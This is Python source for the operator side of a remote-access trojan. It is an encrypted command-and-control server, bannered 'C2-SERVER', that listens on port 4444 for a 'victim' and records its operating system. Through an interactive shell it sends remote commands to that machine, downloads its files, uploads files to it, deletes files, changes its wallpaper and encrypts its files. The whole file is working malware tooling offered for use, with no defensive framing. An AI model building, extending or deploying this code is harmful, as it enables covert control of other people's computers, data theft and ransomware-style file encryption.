import socket
import os
import time
from cryptography.fernet import Fernet

class EncryptedServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cipher = None
        self.operating_system = None
        self.conn = None

    def Start_server(self):
        self.sock.bind(("0.0.0.0", 4444))
        self.sock.listen(1)
        print("[*] Listening for Connections ...")
        self.conn, addr = self.sock.accept()
        print(f"[*] Connection from {addr}")
        key = self.conn.recv(1024)
        self.cipher = Fernet(key)
        self.operating_system = self.conn.recv(1024).decode()
        print(f"Victim's OS => {self.operating_system}")

    def encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)

    def download(self,filename):
        file_size = int(self.conn.recv(1024).decode())
        print(file_size)
        block_size = 1024
        num_blocks = file_size // block_size
        remaining_bytes = file_size % block_size
        with open(f'{filename}','wb') as file:
            full_data = b''
            chunk_number = 1
            for i in range(num_blocks):    
                data = self.conn.recv(1024)
                full_data += data
                print(f"chunk {chunk_number} received.", end='\r',flush=True)
                chunk_number += 1
            data = self.conn.recv(remaining_bytes)
            full_data += data
            print("\nLast Chunk received")
            file.write(full_data)
            file.close()
            print("\nFile received successfully.")

    def upload(self,filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        file_size_upload = str(os.path.getsize(file_path))
        self.conn.sendall(file_size_upload.encode())
        print(file_size_upload)
        time.sleep(0.2)
        block_size = 1024
        num_blocks = int(file_size_upload) // block_size
        remaining_bytes = int(file_size_upload) % block_size
        with open(filename, 'rb') as file:
            chunk_number = 1
            for i in range(num_blocks):
                data_chunk = file.read(1024)
                self.conn.sendall(data_chunk)
                print(f"Chunk {chunk_number} sent.", end='\r',flush=True)
                chunk_number += 1
                time.sleep(0.2)
            data_chunk = file.read(remaining_bytes)
            self.conn.sendall(data_chunk)
            print("\nLast chunk sent")
            file.close()
            print("\nFile sent successfully.")

    def to_chunks(self, data: bytes, chunk_size: int = 1024):
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def authenticate(self):
        for times in range(3):
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))

            result = self.decrypt(self.conn.recv(1024)).decode()
            print(result)
            if "successful" in result:
                return True
        self.conn.close()
        return False

    def send_command(self, command: str):
        self.conn.sendall(self.encrypt(command.encode()))

    def handle_response(self, command: str):
        if "del" in command:
            print(self.decrypt(self.conn.recv(1024)).decode())


        elif "upload" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            time.sleep(0.1)
            self.upload(file_name)

        elif "download" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            time.sleep(0.1)
            self.download(file_name)
        
        elif "encrypt" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)
        
        elif "decrypt" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            time.sleep(0.1)
            response = self.decrypt(self.conn.recv(1024)).decode()
            print(response)


        else:
            num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
            print(f"Chunks coming: {num_chunks}")
            encrypted_data = b''
            for _ in range(num_chunks):
                encrypted_data += self.conn.recv(1024)
                print(f"Chunk number {_} received. ", end="\r",flush=True)
            try:
                print(self.decrypt(encrypted_data).decode())
            except Exception as e:
                print(f"Error decrypting data: {e}")

    def run(self):
        try:
            if not self.authenticate():
                return

            print("""\nAvailable commands:
                    dir, path, ipconfig, arp -a, hostname
                    del [file], cd [path], download [file], upload [file], wall [img]
                    encrypt [file], decrypt [file]
                """)

            while True:
                command = input("shell> ").strip()
                if command == "help":
                    print("""Available commands:
                            dir, path, ipconfig, arp -a, hostname
                            del [file], cd [path], download [file], upload [file], wall [img]
                            encrypt [file], decrypt [file]
                        """)
                    continue

                elif (command.lower() == "exit") or (command.lower() == "close"):
                    print("\n[!] Interrupted by user. Closing connection.")
                    self.send_command("close")
                    self.conn.close()
                    break

                self.send_command(command)
                self.handle_response(command)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            self.send_command("close")
        finally:
            self.conn.close()


if __name__ == "__main__":
    print("""
 ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
""")
    server = EncryptedServer()
    server.Start_server()
    server.run()
